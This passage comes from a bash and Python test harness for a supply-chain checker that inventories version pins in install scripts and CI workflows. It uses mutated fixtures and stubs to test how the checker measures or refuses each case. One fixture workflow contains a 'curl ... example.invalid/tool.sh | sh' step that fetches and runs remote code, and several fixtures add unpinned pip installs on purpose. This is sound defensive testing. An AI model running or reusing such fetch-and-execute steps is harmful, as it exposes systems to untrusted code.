    spec = importlib.util.spec_from_file_location(name.replace("-", "_"), os.path.join(SC, name + ".py"))
    m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m); return m
def die(msg):
    print("install-build-tools: " + msg); sys.exit(1)
def inventory(path):
    inv = load("pin-inventory"); age = load("pin-age-check")
    text = open(path).read(); f = {"bin/install-build-tools.sh": text}
    um = inv.unmeasured(f)
    if um:
        die("unmeasured: " + "; ".join("%s: %s" % (w, l) for (_, w, l) in sorted(um)))
    vers = {}
    for t in TOOLS:
        m = re.search(re.escape(HOST + TOOLS[t]) + r"/releases/download/v(\d+\.\d+\.\d+)/", text)
        if not m:
            die("no literal release address for " + t)
        vers[t] = m.group(1)
    want = {(TOOLS[t], "v" + vers[t], "%s_%s_linux_%s.tar.gz" % (t, vers[t], a)) for t in TOOLS for a in ARCHES}
    got = set()
    for it in inv.inventory(f).values():
        repo = age.TOOL_REPOS.get(it.name) or (it.name if re.fullmatch(r"[\w.-]+/[\w.-]+", it.name) else None)
        if it.kind != "tool" or not repo or not age.is_pin(it.version) or re.search(r"\$\{|\(variable\)|\(expression\)|\(unmeasured", it.name) or "#" not in it.path:
            die("not a measurable pin with its checksum bound: " + it.key)
        got.add((it.name, it.version, it.path.split("#")[0]))
    if got != want:
        die("measured %s, wanted %s" % (sorted(got), sorted(want)))
    print("measured: " + ", ".join(sorted("%s@%s %s" % g for g in got)))
def mutate(src, out, kind):
    lines = open(src).read().split("\n")
    def edit(label, rx, rep):
        for i, ln in enumerate(lines):
            if re.match(r"^\s*%s\)" % re.escape(label), ln):
                new, k = re.subn(rx, rep, ln, count=1)
                if k == 1:
                    lines[i] = new; return
        print("mutant %s did not apply" % kind); sys.exit(3)
    if kind == "variable":
        edit("melange-amd64", r"/download/v[^/]+/", "/download/v$ver/")
    elif kind == "repovar":
        edit("apko-amd64", re.escape(HOST) + r"[\w.-]+/[\w.-]+/", lambda m: HOST + "$repo/")
    elif kind == "mismatch":
        edit("apko-arm64", r"/download/v(\d+)\.(\d+)\.(\d+)/apko_\d+\.\d+\.\d+_", lambda m: "/download/v{0}.{1}.{2}/apko_{0}.{1}.{2}_".format(m.group(1), m.group(2), int(m.group(3)) + 1))
    else:
        print("unknown mutant " + kind); sys.exit(2)
    open(out, "w").write("\n".join(lines))
{"inventory": lambda: inventory(sys.argv[3]), "mutate": lambda: mutate(sys.argv[3], sys.argv[4], sys.argv[5])}[sys.argv[2]]()
PY
ibt() { python3 "$work/ibt-inv.py" "$here/../supply-chain" "$@" </dev/null >"$work/ibt.out" 2>&1; }
# ibt_refused KIND REGEX [RUNNER]: the inventory command is ibt unless a harness case names a stub as the third argument (never read from the environment)
ibt_refused() { local kind=$1 kw=$2 run=ibt; [ $# -lt 3 ] || run=$3; ibt mutate "$root/bin/install-build-tools.sh" "$work/ibt-$kind.sh" "$kind" || return 1; local rc=0; "$run" inventory "$work/ibt-$kind.sh" || rc=$?
  [ "$rc" -ne 0 ] && [ "$rc" -ne 126 ] && [ "$rc" -ne 127 ] && grep -Eq -- "$kw" "$work/ibt.out"; }   # 126/127: the inventory could not RUN, which is not a refusal
CASE="REQ-SUP-001-AC18: the real inventory measures install-build-tools.sh as 4 pins (melange and apko x amd64 and arm64, owner/repo@vX.Y.Z, checksum bound), nothing unmeasured"
check ibt inventory "$root/bin/install-build-tools.sh"
CASE="REQ-SUP-001-AC18: a variable version in the release address is read as a placeholder, not a pin (pin-age refuses it)"
check ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'
CASE="REQ-SUP-001-AC18: a variable repository in the release address is unmeasured (pin-age refuses it)"
check ibt_refused repovar 'unmeasured: a download'
CASE="REQ-SUP-001-AC18: a URL version that differs from the pinned set is measured as a version outside it"
check ibt_refused mismatch 'wanted'
# the harness itself: a failure to RUN the inventory (exit 126 not executable, 127 not found) is not a refusal, even when the output names the diagnostic
ibt_stub_rc=1 ibt_stub_msg=""
ibt_stub() { [ "$1" = inventory ] || { ibt "$@"; return; }; printf '%s' "$ibt_stub_msg" >"$work/ibt.out"; return "$ibt_stub_rc"; }
# stub_refused RC [OUTPUT]: the stub exits RC after printing OUTPUT (default: the expected diagnostic)
stub_refused() { ibt_stub_rc=$1; ibt_stub_msg=${2-install-build-tools: unmeasured: a download}; ibt_refused repovar 'unmeasured: a download' ibt_stub; }
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 1 with the diagnostic counts as a refusal (the stub stands in correctly)"
check stub_refused 1
CASE="REQ-SUP-001-AC18 harness: an inventory that could not be found (exit 127) is not a refusal, even with the diagnostic"
check eval '! stub_refused 127'
CASE="REQ-SUP-001-AC18 harness: an inventory that could not be executed (exit 126) is not a refusal, even with the diagnostic"
check eval '! stub_refused 126'
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 1 with a WRONG diagnostic is not a refusal (the diagnostic is pinned)"
check eval '! stub_refused 1 "install-build-tools: measured something else"'
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 1 with EMPTY output is not a refusal (the diagnostic is pinned)"
check eval '! stub_refused 1 ""'
CASE="REQ-SUP-001-AC18 harness: an inventory that exits 0 WITH the diagnostic is not a refusal (the nonzero status is pinned)"
check eval '! stub_refused 0'
# the inventory command is never read from the environment: with IBT_RUN exported as a stub that always prints a diagnostic and exits 1,
# the real cases still run the real inventory (the stub's diagnostic never satisfies them, the real one does)
ibt_env_stub() { [ "$1" = inventory ] || { ibt "$@"; return; }; echo "install-build-tools: unmeasured: a download" >"$work/ibt.out"; return 1; }
# iso W H R CMD...: run CMD in a child bash with IBT_RUN exported as the stub; the paths and the command reach the child as ARGUMENTS, never spliced into its script
iso() { IBT_RUN=ibt_env_stub bash -c "$(declare -f ibt ibt_refused ibt_env_stub)"'
work=$1 here=$2 root=$3; shift 3; "$@"' iso-child "$@"; }
CASE="REQ-SUP-001-AC18 isolation: with IBT_RUN=ibt_env_stub exported, the variable-version mutant still fails on the REAL diagnostic (not a measurable pin)"
check iso "$work" "$here" "$root" ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'
CASE="REQ-SUP-001-AC18 isolation: with IBT_RUN=ibt_env_stub exported, the stub's diagnostic is not what the variable-version mutant yields"
check iso "$work" "$here" "$root" eval '! ibt_refused variable "unmeasured: a download"'
CASE="REQ-SUP-001-AC18 isolation: with IBT_RUN=ibt_env_stub exported, the real positive case still passes"
check iso "$work" "$here" "$root" ibt inventory "$root/bin/install-build-tools.sh"
q="$work/it's a dir"; mkdir -p "$q/agent/tests" "$q/root/bin"; cp -R "$here/../supply-chain" "$q/agent/supply-chain"; cp "$root/bin/install-build-tools.sh" "$q/root/bin/"; cp "$work/ibt-inv.py" "$q/"
CASE="REQ-SUP-001-AC18 isolation: under a path with an apostrophe and a space, the real positive case still passes"
check iso "$q" "$q/agent/tests" "$q/root" ibt inventory "$q/root/bin/install-build-tools.sh"
CASE="REQ-SUP-001-AC18 isolation: under a path with an apostrophe and a space, the variable-version mutant still fails on the REAL diagnostic"
check iso "$q" "$q/agent/tests" "$q/root" ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'

# --- D3 (ruled): a `uses: ./<path>` line (a local action or a local reusable workflow, with or without with: or env) is a file of the same commit, not a pin ---
# pin-age lists no version for it and refuses nothing for it; the called file is inventoried by its own rules.
cat >"$work/callee.yml" <<EOF
on: workflow_call
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@$SHA1 # v4.1.0
EOF
# lcall NAME USES [WITH-BLOCK]: a copy of base whose head adds .github/workflows/callee.yml and a job `c` in ci.yml calling USES (the pieces travel in files)
lcall() {
  local n=$1 uses=$2 with=${3:-}
  printf '%s' "$uses" >"$work/lcall.uses"; printf '%s' "$with" >"$work/lcall.with"
  newcase "$n" "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
c = w / 'ci.yml'
uses = pathlib.Path(r'$work/lcall.uses').read_text()
with_ = pathlib.Path(r'$work/lcall.with').read_text()
c.write_text(c.read_text() + '  c:\n    uses: ' + uses + '\n' + with_)"
}
lcall l1 './.github/workflows/callee.yml'
lws=($'    with:\n      mode: release\n      digests: ${{ needs.j.outputs.digests }}\n' $'    with:\n      tool-version: 9.9.9\n'
     $'    with:\n      tool-version: ${{ inputs.v || \'9.9.9\' }}\n' $'    with:\n      pin: v2.17.1\n'
     $'    with:\n      digest: sha256:'"$(printf '7%.0s' $(seq 64))"$'\n')
i=0
i=0
newcase lmoved "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text().replace('$SHA1', '$NEW1'))
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: ./.github/workflows/callee.yml\n')"
runck lmoved

# --- REQ-SUP-001-an unpinned package named by a script line, in a file a reviewed_files row names (the mechanism, no parser) ---
# A script line whose pip install names a package with no version is an item that cannot pass. The base branch's exceptions file may rule it with a reviewed_files
# row of the file ({file, ruling}). Only a script (*.sh) outside .github/agent/ can be ruled; the same text in a workflow
# step, or in a script under .github/agent/, fails as before; a line the base already holds is never ruled.
pk_line="       'run: |\\n          bash bin/witnessed.sh apk bin/build-stage-apk.sh\\n          pip install requests'"
pyk() { python3 -c 'import sys; print("import pathlib\npathlib.Path(%r).write_text(%r)" % (sys.argv[1], sys.argv[2]))' "$1" "$2"; }
# pkrows OUT MODE FILE LINE REPO: the exceptions file, the row of FILE (file and ruling, written by rf.py)
pkrows() {
  local mode=$2; [ "$mode" = count2 ] && mode=all
  python3 "$work/rf.py" "$1" "$5" "$mode" "$3"
}
newcase pk "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
$pk_line
")"
CASE="only the package items THAT line made leave the moved list: the package is neither a finding nor listed as moved"
check bash -c "! grep -q 'pypi/requests' '$work/pk.out'"; check bash -c "! grep -q 'pypi/requests' '$work/pk.json'"
newcase pkedit "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
${pk_line/requests/requests2}
")"
pkrows "$work/pk-orig.json" ok bin/judge-test.sh "$pk_line" "$work/pk"
newcase pktwo "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
$pk_line
$pk_line
")"
newcase pkwf "
import pathlib
c = pathlib.Path('.github/workflows/ci.yml')
c.write_text(c.read_text() + '      - run: pip install requests\n')"
newcase pkpinned "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
pip install fixture-pkg==3.1.4 --hash=sha256:aaaa
")"
newcase pkff "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
$(printf 'pip install requests\f')
")"

# --- D3, more spellings of a local line: no item, nothing refused ---
# lcallc NAME USES [WITH] [CALLEE-TEXT-FILE]: like lcall, with the callee's text taken from a file
lcallc() {
  local n=$1 uses=$2 with=${3:-} callee=${4:-$work/callee.yml}
  printf '%s' "$uses" >"$work/lcall.uses"; printf '%s' "$with" >"$work/lcall.with"
  newcase "$n" "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$callee').read_text())
c = w / 'ci.yml'
uses = pathlib.Path(r'$work/lcall.uses').read_text()
with_ = pathlib.Path(r'$work/lcall.with').read_text()
c.write_text(c.read_text() + '  c:\n    uses: ' + uses + '\n' + with_)"
}
lcallc m1 './.github/workflows/callee.yaml'
lcallc m2 './.github/workflows/ca..llee.yml'
printf '%s' "\" ./.github/workflows/callee.yml\"" >"$work/lcall.uses"
newcase m3 "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: \" ./.github/workflows/callee.yml\"\n')"
printf '%s\n' 'on: workflow_call' >"$work/callee-empty.yml"
lcallc m4 './.github/workflows/callee.yml' '' "$work/callee-empty.yml"
cat >"$work/callee-notcall.yml" <<EOF
on: push
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@$SHA1 # v4.1.0
EOF
lcallc m6 './.github/workflows/callee.yml' '' "$work/callee-notcall.yml"
lcallc m7 './.github/workflows/callee.yml' $'    with:\n      mode2: release\n'
lcallc m8 './.github/workflows/callee.yml' $'    with:\n      mode: café\n'
lcallc m9 './.github/workflows/callee.yml' $'    with:\n      steps: [one, \'two2\']\n'
lcallc menv './.github/workflows/callee.yml' $'    secrets: inherit\n    with:\n      mode: release\n'
cat >"$work/callee-dl.yml" <<EOF
on: workflow_call
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL https://example.invalid/tool.sh | sh
EOF
lcallc m11 './.github/workflows/callee.yml' '' "$work/callee-dl.yml"
newcase mstep "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text().replace('    steps:\n      - uses: actions/checkout@$SHA1 # v4.1.0\n', '    steps:\n      - uses: ./.github/workflows/callee.yml\n      - uses: actions/checkout@$SHA1 # v4.1.0\n', 1))"
# a local call whose with: input changes between base and head: nothing is listed or refused
rm -rf "$work/mchg"; cp -R "$base" "$work/mchg"
( cd "$work/mchg" && python3 - "$work/callee.yml" <<'PY'
import pathlib, subprocess, sys
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(sys.argv[1]).read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: " ./.github/workflows/callee.yml"\n    with:\n      pin: v1.0.0\n')
subprocess.run(["git", "add", "-A"], check=True)
subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-qm", "base2"], check=True)
c.write_text(c.read_text().replace("v1.0.0", "v9.9.9"))
subprocess.run(["git", "add", "-A"], check=True)
subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-qm", "head2"], check=True)
PY
)

# the line identity
printf '%s\n' '#!/usr/bin/env bash' 'DEPS=requests' 'pip install "$DEPS"' >"$work/mix-base.sh"
printf '%s\n' '#!/usr/bin/env bash' 'DEPS=flask' 'pip install "$DEPS"' '# pip install fixture' >"$work/mix-head.sh"
rm -rf "$work/mix"; cp -R "$base" "$work/mix"
( cd "$work/mix" && cp "$work/mix-base.sh" bin/mix-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm b2 && cp "$work/mix-head.sh" bin/mix-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm h2 )
newcase pkscan "
import pathlib
f = pathlib.Path('bin/install-scanner.sh')
f.write_text(f.read_text() + 'echo \"fixture pip install requests\"\n')"
# the advisory audit judges the same line once: with a row it is not an advisory hit, without it it is (exit 1)
audfx() {  # REPO OUT: a fixtures file with an advisory against the repo's unpinned requests item
  python3 - "$work/$1" "$2" "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, json, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[3]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
k = [k for k in inv.load_at(sys.argv[1], None) if k.startswith("package:pypi/requests@(unpinned)")]
assert len(k) == 1, k
json.dump({"lists": {k[0]: {"github": [{"id": "GHSA-test-test-test", "incident": "INC-T", "affected": True, "modified": "2026-09-01T00:00:00Z"}], "osv": []}},
           "upstream": {}, "prs": []}, open(sys.argv[2], "w"))
PY
}
audfx pk "$work/aud.fx.json"
# --- round 2 of the review of PR 329: state between calls, a relay, a self-call, an identical copy, a fractional clock -------------------------------------
cat >"$work/callee2.yml" <<EOF
on: workflow_call
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@$SHA5 # v4.2.0
EOF
newcase two "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
(w / 'callee2.yml').write_text(pathlib.Path(r'$work/callee2.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c1:\n    uses: ./.github/workflows/callee.yml\n  c2:\n    uses: ./.github/workflows/callee2.yml\n')"
# the second call already in the base, the first added in the head: the unchanged second must not move
rm -rf "$work/two2"; cp -R "$base" "$work/two2"
( cd "$work/two2" && python3 - "$work" <<'PY'
import pathlib, subprocess, sys
work = sys.argv[1]
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(work + '/callee.yml').read_text())
(w / 'callee2.yml').write_text(pathlib.Path(work + '/callee2.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c2:\n    uses: ./.github/workflows/callee2.yml\n')
g = lambda *a: subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True)
g("add", "-A"); g("commit", "-qm", "b")
c.write_text(c.read_text() + '  c1:\n    uses: ./.github/workflows/callee.yml\n')
g("add", "-A"); g("commit", "-qm", "h")
PY
)
printf 'on: workflow_call\njobs:\n  j:\n    uses: ./.github/workflows/selfcall.yml\n' >"$work/selfcall.yml"
newcase selfc "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'selfcall.yml').write_text(pathlib.Path(r'$work/selfcall.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: ./.github/workflows/selfcall.yml\n')"
# an identical copy added beside an unchanged install line whose assignment changed
printf '%s\n' '#!/usr/bin/env bash' 'DEPS=requests' 'pip install "$DEPS"' >"$work/cp-base.sh"
printf '%s\n' '#!/usr/bin/env bash' 'DEPS=flask' 'pip install "$DEPS"' 'pip install "$DEPS"' >"$work/cp-head.sh"
rm -rf "$work/cp"; cp -R "$base" "$work/cp"
( cd "$work/cp" && cp "$work/cp-base.sh" bin/cp-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm b3 && cp "$work/cp-head.sh" bin/cp-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm h3 )
pkrows "$work/pk-cp.json" ok bin/cp-test.sh 'pip install "$DEPS"' "$work/cp"
audfx cp "$work/aud-cp.fx.json" 2>/dev/null || true
# D3 with a with: block on a local call (a block, and an empty block)
printf '%s\n' "on: workflow_call" "jobs:" "  k:" "    runs-on: ubuntu-latest" "    steps:" "      - uses: actions/checkout@$SHA1 # v4.1.0" >"$work/callee-w.yml"
lcallc w1 './.github/workflows/callee.yml' $'    with:\n      mode: release\n' "$work/callee-w.yml"
lcallc w2 './.github/workflows/callee.yml' $'    with: {}\n' "$work/callee-w.yml"

CASE="full sha256: the collision pairs both seats reproduced under the old 32-48 bit tags (a checksum set, a step tag of an expression, a default-installer step) are different identities"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def keys(files): return set(inv.inventory(files))
# a step tag: the same go install with two different input expressions
w = lambda v: {".github/workflows/a.yml": "jobs:\n  j:\n    runs-on: x\n    steps:\n      - run: go install example.com/tool@${{ inputs.%s }}\n" % v}
assert keys(w("v205063")) != keys(w("v1326818"))
# a checksum set: the same release download with two different 64-hex checksums that collided under the 32-bit tag
c = lambda s: {".github/workflows/a.yml": "jobs:\n  j:\n    runs-on: x\n    steps:\n      - run: |\n          curl -fsSL https://github.com/o/r/releases/download/v1.0.0/x.tgz -o x.tgz\n          echo '%s  x.tgz' | sha256sum -c -\n" % s.rjust(64, "0")}
assert keys(c("7158")) != keys(c("1f235"))
# a default-installer step: two steps differing only outside with/uses
d = lambda n: {".github/workflows/a.yml": "jobs:\n  j:\n    runs-on: x\n    steps:\n      - uses: actions/setup-python@%s # v6.1.0\n        name: collision-%s\n" % ("4" * 40, n)}
assert keys(d("8189")) != keys(d("89291"))
for k in keys(c("7158")) | keys(w("v205063")):
    tag = k.split("#", 1)[1] if "#" in k else ""
    if tag.startswith(("step:", "default:")):
        assert len(tag.split(":")[-1]) == 64, k
PY

# --- REQ-SUP-001-a file named by .github/policy/base-inputs.json is no item (orchestrator Oct 14: the plainest closed form, no pattern on names) ---------------
# The list is read from the base branch's copy beside the script (CI: trusted/), or --base-inputs FILE; a file listed there is the repository's own base record
# (its content change is the chain's base-input-changed signal). A missing list exempts nothing; a malformed one stops the check (exit 2).
printf '%s\n' "sha256:aaaa  x" >"$work/bi-keys.sha256"
newcase bi "
import pathlib
p = pathlib.Path('build/locks'); p.mkdir(parents=True, exist_ok=True)
(p / 'archive-keys.sha256').write_text('wolfi-signing.rsa.pub sha256:' + 'a' * 64 + '\\n')
(p / 'archive-index.sha256').write_text('x86_64 sha256:' + 'b' * 64 + '\\n')"
# the checker's default list is the copy beside the script: a copy of the agent directory with an EMPTY policy list stands for "no list" (the tree itself may carry a real one)
mkdir -p "$work/sc/.github/policy" && cp -R "$here/.." "$work/sc/.github/agent" && printf '%s' '{"base_inputs": []}' >"$work/sc/.github/policy/base-inputs.json"
chk_nolist="$work/sc/.github/agent/supply-chain/pin-age-check.py"
printf '%s' '{"base_inputs": ["build/locks/archive-keys.sha256", "build/locks/archive-index.sha256"]}' >"$work/bi-ok.json"
printf '%s' '{"base_inputs": ["build/locks/archive-keys.sha256"]}' >"$work/bi-one.json"
printf '%s' '{"base_inputs": ["build/locks/other.sha256", "./build/locks/archive-keys.sha256", "build/locks/../locks/archive-keys.sha256"]}' >"$work/bi-near.json"
printf '%s' '{"base_inputs": "build/locks/archive-keys.sha256"}' >"$work/bi-str.json"
printf '%s' '{"base_inputs": ["build/locks/archive-keys.sha256", 7]}' >"$work/bi-int.json"
printf '%s' '{"base_inputs": [], "base_inputs": ["build/locks/archive-keys.sha256"]}' >"$work/bi-dup.json"
printf '%s' 'not json' >"$work/bi-bad.json"
printf '%s' '{"base_inputs": []}' >"$work/bi-empty.json"
rm -rf "$work/bi3"; cp -R "$work/bi" "$work/bi3"
( cd "$work/bi3" && printf '%s\n' "x86_64 sha256:cccc" >build/locks/archive-index.sha256.bak && mkdir -p docs && printf '%s\n' "x86_64 sha256:dddd" >docs/archive-index.sha256 && git add -A && git -c user.name=t -c user.email=t@x commit -qm lookalikes )
# a pull request's own list is never read: the default is the copy beside the script, not the tree under --root
rm -rf "$work/bi2"; cp -R "$work/bi" "$work/bi2"
( cd "$work/bi2" && printf '%s\n' "x86_64 sha256:eeee" >build/locks/zz-record.sha256 && mkdir -p .github/policy && printf '%s' '{"base_inputs": ["build/locks/archive-keys.sha256", "build/locks/archive-index.sha256", "build/locks/zz-record.sha256"]}' >.github/policy/base-inputs.json && git add -A && git -c user.name=t -c user.email=t@x commit -qm list )
# a missing default list lists nothing: a copy of the supply-chain dir with no .github/policy/base-inputs.json beside it exempts nothing and is not an error
rm -rf "$work/nl"; mkdir -p "$work/nl/.github/agent"; cp -R "$(dirname "$chk")" "$work/nl/.github/agent/supply-chain"

CASE="two release downloads whose asset names differ only in the shell variable (or expression) they hold are two items, a changed variable is a moved item, and a concrete asset keeps its key (REQ-SUP-001-the check names every version that moved, a moved asset behind a variable included)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def dl(asset, tag="v1.2.3", where="bin/x.sh"):
    return {where: "curl -fsSL https://github.com/o/r/releases/download/%s/%s -o x\n" % (tag, asset)}
a, b = inv.inventory(dl("${A}.tgz")), inv.inventory(dl("${B}.tgz"))
assert len(a) == 1 and len(b) == 1 and set(a) != set(b), (sorted(a), sorted(b))
assert all("#step:" in k for k in list(a) + list(b)), (sorted(a), sorted(b))
assert set(a) == set(inv.inventory(dl("${A}.tgz"))), "the same spelling must give the same key"
assert len(inv.moved(a, b)) == 1, inv.moved(a, b)
# an expression, a braced variable and a bare one: each spelling is its own key
for x, y in (("${{ matrix.os }}.tgz", "${{ matrix.arch }}.tgz"), ("$OS.tgz", "$ARCH.tgz"), ("x_${OS}.tgz", "x_${ARCH}.tgz")):
    kx, ky = set(inv.inventory(dl(x))), set(inv.inventory(dl(y)))
    assert len(kx) == 1 and len(ky) == 1 and kx != ky, (x, y, sorted(kx), sorted(ky))
# a concrete asset is unchanged: no step tag, the key the inventory has always had
assert set(inv.inventory(dl("x.tgz"))) == {"tool:o/r/x.tgz@v1.2.3"}, sorted(inv.inventory(dl("x.tgz")))
# the same asset in a workflow step, the form every workflow takes
wf = lambda asset: {".github/workflows/ci.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -fsSL https://github.com/o/r/releases/download/v1.2.3/%s -o x\n" % asset}
assert set(inv.inventory(wf("${A}.tgz"))) != set(inv.inventory(wf("${B}.tgz")))
PY

CASE="release downloads behind variables or expressions, round 1 findings: two assets in one step are two items; an identical added occurrence is a moved item; whitespace inside an expression literal is part of the identity; a scanner assignment and a composite input default are part of the identity (REQ-SUP-001-the check names every version that moved)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
dl = lambda a: "curl -fsSL https://github.com/o/r/releases/download/v1.2.3/" + a + " -o x"
def wf(run, name="ci.yml"):
    body = "".join("          " + l + "\n" for l in run.split("\n"))
    return {".github/workflows/" + name: "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n" + body}
assert len(inv.inventory(wf(dl("${A}.tgz") + "\n" + dl("${B}.tgz")))) == 2
base = wf(dl("${A}.tgz")); head = dict(base); head[".github/workflows/other.yml"] = wf(dl("${A}.tgz"))[".github/workflows/ci.yml"]
assert len(inv.moved(inv.inventory(base), inv.inventory(head))) == 1
e1, e2 = "${{ contains('a  b', 'a b') }}.tgz", "${{ contains('a b', 'a b') }}.tgz"
assert len(inv.moved(inv.inventory(wf(dl(e1))), inv.inventory(wf(dl(e2))))) == 1
sc = lambda v: {"bin/install-scanner.sh": "A=" + v + "\n" + dl("${A}") + "\n"}
assert len(inv.moved(inv.inventory(sc("x.tgz")), inv.inventory(sc("y.tgz")))) == 1
co = lambda v: {".github/actions/x/action.yml": "name: x\ninputs:\n  asset:\n    default: " + v + "\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: " + dl("${{ inputs.asset }}") + "\n"}
assert len(inv.moved(inv.inventory(co("x.tgz")), inv.inventory(co("y.tgz")))) == 1
PY

CASE="release downloads behind variables, round 2 findings: a later assignment, an indirect assignment (A=\$B) and the whitespace of a continued value are part of a script download's identity; a local composite call's with: value is part of the call's identity; an unrelated placeholder item keeps the key it had "
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
dl = 'curl -fsSL "https://github.com/o/r/releases/download/v1.2.3/${A}" -o x\n'
variants = [("A=x.tgz\n" + dl + "A=z.tgz\n", "A=y.tgz\n" + dl + "A=z.tgz\n"),
            ("B=x.tgz\nA=$B\n" + dl, "B=y.tgz\nA=$B\n" + dl),
            ('A=$(printf "%s" "x\\\n  .tgz" | tr " " "_")\n' + dl, 'A=$(printf "%s" "x\\\n   .tgz" | tr " " "_")\n' + dl)]
for script in ("bin/install-scanner.sh", "bin/x.sh"):
    for before, after in variants:
        assert inv.moved(inv.inventory({script: before}), inv.inventory({script: after})), (script, before)
action = "name: x\ninputs:\n  asset:\n    default: x.tgz\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl https://github.com/o/r/releases/download/v1.2.3/${{ inputs.asset }}\n"
tree = lambda a: {".github/actions/x/action.yml": action, ".github/workflows/ci.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./.github/actions/x\n        with:\n          asset: " + a + "\n"}
assert inv.moved(inv.inventory(tree("x.tgz")), inv.inventory(tree("y.tgz")))
q = lambda v: {".github/workflows/ci.yml": "on: push\nenv:\n  A: old\n  B: new\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://github.com/o/r/releases/download/v1.2.3/tool-\"${" + v + "}\".tgz\n"}
assert inv.moved(inv.inventory(q("A")), inv.inventory(q("B"))), "a variable after a quote is part of the asset name"
assert set(inv.inventory({"bin/x.sh": "pip install black\n"})) == {"package:pypi/black@(unpinned)#step:c38ddd42b810871e60f5080663fe9d5d899dd5a38d61c1563b41a1b78a56eed5"}
wfk = {".github/workflows/ci.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: pip install black\n"}
assert set(inv.inventory(wfk)) == {"package:pypi/black@(unpinned)#step:875cc02f02e6bc952fc1bca71c436657c10fc7e27058713fbd137cf0aed5eed8"}
PY

CASE="release downloads behind variables, round 3 findings: assignment ORDER, a name holding \$( ) with a space, composite input context kept apart from other items' keys, and a query variable that is not part of the name "
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
dl = 'curl "' + url + '${A}.tgz" -o x\n'
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    assert inv.moved(inv.inventory({path: "B=x\nA=$B\nB=y\n" + dl}), inv.inventory({path: "B=y\nA=$B\nB=x\n" + dl})), path
wf = lambda asset: {".github/workflows/ci.yml": "on: push\nenv:\n  A: x\n  B: y\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl \"" + url + asset + "\" -o x\n"}
a, b = wf('$(printf %s "$A").tgz'), wf('$(printf %s "$B").tgz')
